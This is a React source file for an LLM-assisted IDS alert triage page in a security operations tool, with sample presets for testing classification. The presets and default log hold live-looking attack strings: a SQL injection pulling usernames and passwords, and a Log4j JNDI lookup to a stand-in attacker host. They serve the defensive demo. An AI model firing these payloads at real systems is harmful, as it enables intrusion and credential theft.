import React, { useState, useEffect } from 'react';
import {
  Cpu,
  Terminal,
  ShieldCheck,
  Flame,
  CheckCircle2,
  AlertOctagon,
  RefreshCw,
  Copy,
  Save,
  Send,
  Sliders,
  Sparkles,
  ArrowRight,
  Database,
  Radio
} from 'lucide-react';
import { analysesApi, alertsApi } from '../services/api';
import { Alert } from '../types';
import { SeverityBadge, PriorityBadge } from '../components/common/Badges';

export const AlertAnalysisPage: React.FC = () => {
  const [rawLog, setRawLog] = useState<string>(
    'GET /login.php?user=admin%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1\r\nHost: 10.0.0.14\r\nUser-Agent: Mozilla/5.0'
  );
  const [sourceIp, setSourceIp] = useState('45.33.32.156');
  const [destIp, setDestIp] = useState('10.0.0.14');
  const [protocol, setProtocol] = useState('TCP');
  const [attackType, setAttackType] = useState('SQL Injection');
  const [provider, setProvider] = useState('gemini');
  const [model, setModel] = useState('gemini-2.5-flash');

  // Pre-fill selection
  const [existingAlerts, setExistingAlerts] = useState<Alert[]>([]);
  const [selectedAlertId, setSelectedAlertId] = useState<string>('');

  // Execution states
  const [analyzing, setAnalyzing] = useState(false);
  const [analysisStep, setAnalysisStep] = useState(0);
  const [result, setResult] = useState<any | null>(null);
  const [saveSuccess, setSaveSuccess] = useState(false);

  useEffect(() => {
    const loadAlerts = async () => {
      try {
        const data = await alertsApi.list({ page: 1, page_size: 20 });
        setExistingAlerts(data.alerts);
      } catch (err) {
        console.error(err);
      }
    };
    loadAlerts();
  }, []);

  const handleSelectExistingAlert = (alertIdStr: string) => {
    setSelectedAlertId(alertIdStr);
    const found = existingAlerts.find((a) => a.id === parseInt(alertIdStr));
    if (found) {
      setRawLog(found.raw_log);
      setSourceIp(found.source_ip);
      setDestIp(found.destination_ip);
      setProtocol(found.protocol);
      setAttackType(found.attack_type);
    }
  };

  const handleAnalyze = async () => {
    if (!rawLog.trim()) {
      alert('Please enter a raw IDS log or payload.');
      return;
    }

    setAnalyzing(true);
    setResult(null);
    setSaveSuccess(false);
    setAnalysisStep(1);

    // Simulated progress steps for smooth UX
    const timer1 = setTimeout(() => setAnalysisStep(2), 500);
    const timer2 = setTimeout(() => setAnalysisStep(3), 1100);
    const timer3 = setTimeout(() => setAnalysisStep(4), 1600);

    try {
      const output = await analysesApi.analyzeRaw({
        raw_log: rawLog,
        source_ip: sourceIp,
        destination_ip: destIp,
        protocol: protocol,
        attack_type: attackType,
        provider: provider,
        model: model,
      });

      setAnalysisStep(5);
      setResult(output);
    } catch (err: any) {
      alert('Analysis error: ' + (err.response?.data?.detail || err.message));
    } finally {
      clearTimeout(timer1);
      clearTimeout(timer2);
      clearTimeout(timer3);
      setAnalyzing(false);
    }
  };

  const handleSaveToAlerts = async () => {
    if (!result) return;
    try {
      await alertsApi.create({
        source_ip: sourceIp,
        destination_ip: destIp,
        protocol: protocol,
        attack_type: attackType,
        signature: `AI Classified: ${result.classification.toUpperCase()} (${result.priority})`,
        raw_log: rawLog,
        severity: result.severity.toUpperCase(),
        status: result.false_positive_likelihood > 0.8 ? 'FALSE_POSITIVE' : 'INVESTIGATING',
      });
      setSaveSuccess(true);
      setTimeout(() => setSaveSuccess(false), 3000);
    } catch (err) {
      alert('Failed to save alert to database.');
    }
  };

  const samplePresets = [
    {
      name: 'SQLi Probe',
      ip: '45.33.32.156',
      dst: '10.0.0.14',
      proto: 'TCP',
      type: 'SQL Injection',
      log: "GET /login.php?user=admin%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1\r\nHost: 10.0.0.14",
    },
    {
      name: 'SSH Brute',
      ip: '185.220.101.5',
      dst: '10.0.0.5',
      proto: 'TCP',
      type: 'Brute Force',
      log: 'SSH-2.0-OpenSSH_8.2p1; Failed password for invalid user root from 185.220.101.5 (attempt 25 in 30s)',
    },
    {
      name: 'Health Check',
      ip: '192.168.1.170',
      dst: '10.0.0.12',
      proto: 'TCP',
      type: 'Health Check',
      log: 'GET /healthz HTTP/1.1\r\nHost: 10.0.0.12\r\nUser-Agent: Kubernetes-Liveness-Probe/1.28',
    },
    {
      name: 'Log4j RCE',
      ip: '185.156.73.55',
      dst: '10.0.0.30',
      proto: 'TCP',
      type: 'Log4j Exploitation',
      log: 'GET /app?token=${jndi:ldap://log4j.attacker.com/payload} HTTP/1.1\r\nUser-Agent: Mozilla/5.0',
    },
  ];

  return (
    <div className="space-y-3 font-mono">
      {/* Header */}
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 pb-2 border-b border-border bg-[#050505] p-2.5">
        <div>
          <div className="flex items-center space-x-2">
            <span className="bg-terminalAmber text-black px-1.5 py-0.2 text-[10px] font-black">
              CMD://AI_TRIAGE
            </span>
            <h1 className="text-sm font-black tracking-wide text-terminalAmber uppercase">
              AI ALERT ANALYSIS &amp; RECLASSIFICATION WORKBENCH
            </h1>
          </div>
          <p className="text-[10px] text-textMuted mt-0.5">
            &gt; Interactive LLM telemetry evaluation, false-positive probability calculation, and structured SOC triage
          </p>
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-3">
        {/* Left Column: Input Workbench */}
        <div className="lg:col-span-7 space-y-3">
          {/* Quick presets & Existing Alert Selector */}
          <div className="terminal-card p-3 space-y-2.5">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 border-b border-border pb-2">
              <span className="text-xs font-black uppercase text-terminalAmber flex items-center">
                <Database className="w-3.5 h-3.5 text-terminalAmber mr-1.5" />
                PRESET TELEMETRY OR BUFFERED ALERT
              </span>
              <div className="flex items-center space-x-1">
                {samplePresets.map((preset) => (
                  <button
                    key={preset.name}
                    type="button"
                    onClick={() => {
                      setRawLog(preset.log);
                      setSourceIp(preset.ip);
                      setDestIp(preset.dst);
                      setProtocol(preset.proto);
                      setAttackType(preset.type);
                      setSelectedAlertId('');
                    }}
                    className="px-1.5 py-0.5 bg-black hover:bg-terminalAmber hover:text-black border border-border text-[10px] font-mono text-terminalAmber font-bold uppercase transition"
                  >
                    [{preset.name}]
                  </button>
                ))}
              </div>
            </div>

            {existingAlerts.length > 0 && (
              <div>
                <select
                  value={selectedAlertId}
                  onChange={(e) => handleSelectExistingAlert(e.target.value)}
                  className="w-full bg-black border border-border px-2.5 py-1 text-xs font-mono text-white outline-none focus:border-terminalAmber"
                >
                  <option value="">&gt; -- OR SELECT INGESTED ALERT FROM DATABASE --</option>
                  {existingAlerts.map((a) => (
                    <option key={a.id} value={a.id}>
                      [{a.alert_id}] {a.attack_type} | {a.source_ip} -&gt; {a.destination_ip} ({a.severity})
                    </option>
                  ))}
                </select>
              </div>
            )}
          </div>

          {/* Alert Metadata Fields */}
          <div className="terminal-card p-3.5 space-y-3">
            <div className="grid grid-cols-2 sm:grid-cols-4 gap-2">
              <div>
                <label className="text-[10px] font-mono uppercase text-terminalAmber block mb-0.5">
                  &gt; SOURCE_IP
                </label>
                <input
                  type="text"
                  value={sourceIp}
                  onChange={(e) => setSourceIp(e.target.value)}
                  className="w-full bg-black border border-border px-2 py-1 text-xs font-mono text-[#00E5FF] font-bold outline-none focus:border-terminalAmber"
                />
              </div>

              <div>
                <label className="text-[10px] font-mono uppercase text-terminalAmber block mb-0.5">
                  &gt; DEST_IP
                </label>
                <input
                  type="text"
                  value={destIp}
                  onChange={(e) => setDestIp(e.target.value)}
                  className="w-full bg-black border border-border px-2 py-1 text-xs font-mono text-white outline-none focus:border-terminalAmber"
                />
              </div>

              <div>
                <label className="text-[10px] font-mono uppercase text-terminalAmber block mb-0.5">
                  &gt; PROTOCOL
                </label>
                <input
                  type="text"
                  value={protocol}
                  onChange={(e) => setProtocol(e.target.value)}
                  className="w-full bg-black border border-border px-2 py-1 text-xs font-mono text-white outline-none focus:border-terminalAmber"
                />
              </div>

              <div>
                <label className="text-[10px] font-mono uppercase text-terminalAmber block mb-0.5">
                  &gt; ATTACK_TYPE
                </label>
                <input
                  type="text"
                  value={attackType}
                  onChange={(e) => setAttackType(e.target.value)}
                  className="w-full bg-black border border-border px-2 py-1 text-xs font-mono text-white outline-none focus:border-terminalAmber"
                />
              </div>
            </div>

            {/* Raw Log Input */}
            <div>
              <div className="flex items-center justify-between mb-1">
                <label className="text-[10px] font-mono uppercase text-terminalAmber font-bold flex items-center">
                  <Terminal className="w-3 h-3 mr-1 text-terminalAmber" />
                  &gt; RAW IDS ALERT / EVENT LOG / PACKET PAYLOAD
                </label>
                <span className="text-[10px] font-mono text-textMuted">
                  [{rawLog.length} BYTES]
                </span>
              </div>
              <textarea
                rows={6}
                value={rawLog}
                onChange={(e) => setRawLog(e.target.value)}
                placeholder="Paste raw Snort, Suricata, Zeek, or Syslog alert payload here..."
                className="w-full bg-black border border-border p-2.5 text-xs font-mono text-white outline-none focus:border-terminalAmber leading-relaxed"
              />
            </div>

            {/* Model Provider Selector */}
            <div className="grid grid-cols-2 gap-2 pt-2 border-t border-border">
              <div>
                <label className="text-[10px] font-mono uppercase text-textMuted block mb-0.5">
                  &gt; LLM_PROVIDER
                </label>
                <select
                  value={provider}
                  onChange={(e) => setProvider(e.target.value)}
                  className="w-full bg-black border border-border px-2 py-1 text-xs font-mono text-terminalAmber font-bold outline-none focus:border-terminalAmber"
                >
                  <option value="gemini">GOOGLE GEMINI</option>
                  <option value="openai">OPENAI GPT</option>
                  <option value="heuristic">HEURISTIC RESEARCH ENGINE</option>
                </select>
              </div>

              <div>
                <label className="text-[10px] font-mono uppercase text-textMuted block mb-0.5">
                  &gt; ARCHITECTURE_MODEL
                </label>
                <select
                  value={model}
                  onChange={(e) => setModel(e.target.value)}
                  className="w-full bg-black border border-border px-2 py-1 text-xs font-mono text-white outline-none focus:border-terminalAmber"
                >
                  <option value="gemini-2.5-flash">gemini-2.5-flash</option>
                  <option value="gemini-1.5-pro">gemini-1.5-pro</option>
                  <option value="gpt-4o-mini">gpt-4o-mini</option>
                  <option value="gpt-4o">gpt-4o</option>
                </select>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="button"
              disabled={analyzing}
              onClick={handleAnalyze}
              className="w-full mt-2 py-2.5 px-4 bg-terminalAmber hover:bg-white text-black font-mono font-black text-xs uppercase tracking-wider flex items-center justify-center space-x-2 transition disabled:opacity-40 border border-terminalAmber"
            >
              {analyzing ? (
                <>
                  <RefreshCw className="w-4 h-4 animate-spin text-black" />
                  <span>&gt; AI TRIAGE PIPELINE IN PROGRESS...</span>
                </>
              ) : (
                <>
                  <Sparkles className="w-4 h-4 text-black" />
                  <span>[EXECUTE AI TRIAGE ASSESSMENT]</span>
                </>
              )}
            </button>
          </div>
        </div>

        {/* Right Column: AI Structured Result & Live Step Visualizer */}
        <div className="lg:col-span-5 space-y-3">
          {/* Step Progression Animation */}
          {analyzing && (
            <div className="terminal-card p-4 border-terminalAmber bg-[#0e0800] space-y-2">
              <div className="flex items-center space-x-2 border-b border-border pb-1.5 text-xs font-mono font-black text-terminalAmber uppercase">
                <RefreshCw className="w-3.5 h-3.5 animate-spin text-terminalAmber" />
                <span>AI REASONING EXECUTION IN PROGRESS</span>
              </div>

              <div className="space-y-1.5 text-xs font-mono">
                <div className={`flex items-center space-x-2 ${analysisStep >= 1 ? 'text-stockGreen' : 'text-textMuted'}`}>
                  <span>{analysisStep >= 1 ? '[✓]' : '[ ]'}</span>
                  <span>Processing IDS alert telemetry</span>
                </div>
                <div className={`flex items-center space-x-2 ${analysisStep >= 2 ? 'text-stockGreen' : 'text-textMuted'}`}>
                  <span>{analysisStep >= 2 ? '[✓]' : '[ ]'}</span>
                  <span>Evaluating threat indicators &amp; signatures</span>
                </div>
                <div className={`flex items-center space-x-2 ${analysisStep >= 3 ? 'text-stockGreen' : 'text-textMuted'}`}>
                  <span>{analysisStep >= 3 ? '[✓]' : '[ ]'}</span>
                  <span>Determining severity &amp; FP likelihood</span>
                </div>
                <div className={`flex items-center space-x-2 ${analysisStep >= 4 ? 'text-stockGreen' : 'text-textMuted'}`}>
                  <span>{analysisStep >= 4 ? '[✓]' : '[ ]'}</span>
                  <span>Assigning operational priority (P1-P4)</span>
                </div>
                <div className={`flex items-center space-x-2 ${analysisStep >= 5 ? 'text-stockGreen' : 'text-textMuted'}`}>
                  <span>{analysisStep >= 5 ? '[✓]' : '[ ]'}</span>
                  <span>Generating analyst mitigation recommendation</span>
                </div>
              </div>
            </div>
          )}

          {/* Structured Analysis Results */}
          {result ? (
            <div className="terminal-card p-4 space-y-3 border-terminalAmber bg-[#080808]">
              <div className="flex items-center justify-between border-b border-border pb-2">
                <div className="flex items-center space-x-2">
                  <CheckCircle2 className="w-4 h-4 text-stockGreen" />
                  <span className="text-xs font-black uppercase text-terminalAmber font-mono">
                    AI STRUCTURED TRIAGE OUTPUT
                  </span>
                </div>
                <PriorityBadge priority={result.priority} size="md" />
              </div>

              {/* Classification Badges */}
              <div className="grid grid-cols-2 gap-2 text-xs font-mono">
                <div className="p-2.5 bg-black border border-border">
                  <span className="text-textMuted text-[10px] uppercase block mb-0.5">
                    CLASSIFICATION
                  </span>
                  <span
                    className={`font-black text-sm uppercase ${
                      result.classification === 'malicious'
                        ? 'text-stockRed'
                        : result.classification === 'benign'
                        ? 'text-stockGreen'
                        : 'text-terminalAmber'
                    }`}
                  >
                    [{result.classification}]
                  </span>
                </div>

                <div className="p-2.5 bg-black border border-border">
                  <span className="text-textMuted text-[10px] uppercase block mb-0.5">
                    SEVERITY
                  </span>
                  <SeverityBadge severity={result.severity} size="md" />
                </div>
              </div>

              {/* Confidence & FP Likelihood */}
              <div className="grid grid-cols-2 gap-2 text-xs font-mono">
                <div className="p-2.5 bg-black border border-border">
                  <span className="text-textMuted text-[10px] uppercase block mb-0.5">
                    CONFIDENCE_SCORE
                  </span>
                  <span className="text-base font-black text-stockGreen font-mono">
                    {Math.round(result.confidence * 100)}%
                  </span>
                </div>

                <div className="p-2.5 bg-black border border-border">
                  <span className="text-textMuted text-[10px] uppercase block mb-0.5">
                    FP_LIKELIHOOD
                  </span>
                  <span className="text-base font-black text-terminalAmber font-mono">
                    {Math.round(result.false_positive_likelihood * 100)}%
                  </span>
                </div>
              </div>

              {/* Security Assessment / Justification */}
              <div>
                <span className="text-[10px] font-mono uppercase text-terminalAmber font-bold block mb-0.5">
                  &gt; AI SECURITY REASONING &amp; JUSTIFICATION
                </span>
                <div className="p-2.5 bg-black border border-border text-xs font-mono text-white leading-relaxed">
                  {result.reason}
                </div>
              </div>

              {/* Recommended Action */}
              <div>
                <span className="text-[10px] font-mono uppercase text-[#00E5FF] font-bold block mb-0.5">
                  &gt; RECOMMENDED SOC MITIGATION ACTION
                </span>
                <div className="p-2.5 bg-black border border-border text-xs font-mono text-[#00E5FF] leading-relaxed">
                  {result.recommended_action}
                </div>
              </div>

              {/* Action Buttons */}
              <div className="pt-2 border-t border-border flex items-center justify-between">
                <button
                  type="button"
                  onClick={handleSaveToAlerts}
                  className="px-3 py-1.5 bg-stockGreen hover:bg-white text-black font-extrabold font-mono text-xs uppercase flex items-center space-x-1.5 transition"
                >
                  <Save className="w-3.5 h-3.5" />
                  <span>{saveSuccess ? '[SAVED TO DATABASE!]' : '[COMMIT TO ACTIVE ALERTS]'}</span>
                </button>

                <button
                  type="button"
                  onClick={() => {
                    navigator.clipboard.writeText(JSON.stringify(result, null, 2));
                    alert('Structured JSON copied to clipboard!');
                  }}
                  className="px-2.5 py-1.5 bg-black hover:bg-terminalAmber hover:text-black border border-border text-terminalAmber text-xs font-bold uppercase transition flex items-center space-x-1"
                >
                  <Copy className="w-3.5 h-3.5" />
                  <span>[RAW JSON]</span>
                </button>
              </div>
            </div>
          ) : !analyzing ? (
            <div className="terminal-card p-6 text-center flex flex-col items-center justify-center h-80 space-y-2">
              <Cpu className="w-8 h-8 text-terminalAmber opacity-40" />
              <h3 className="text-xs font-bold uppercase tracking-wider text-terminalAmber font-mono">
                &gt; AWAITING TELEMETRY INGESTION
              </h3>
              <p className="text-[11px] text-textMuted font-mono max-w-xs leading-relaxed">
                Paste an IDS alert payload or choose a preset on the left and click "[EXECUTE AI TRIAGE ASSESSMENT]" to execute LLM classification.
              </p>
            </div>
          ) : null}
        </div>
      </div>
    </div>
  );
};
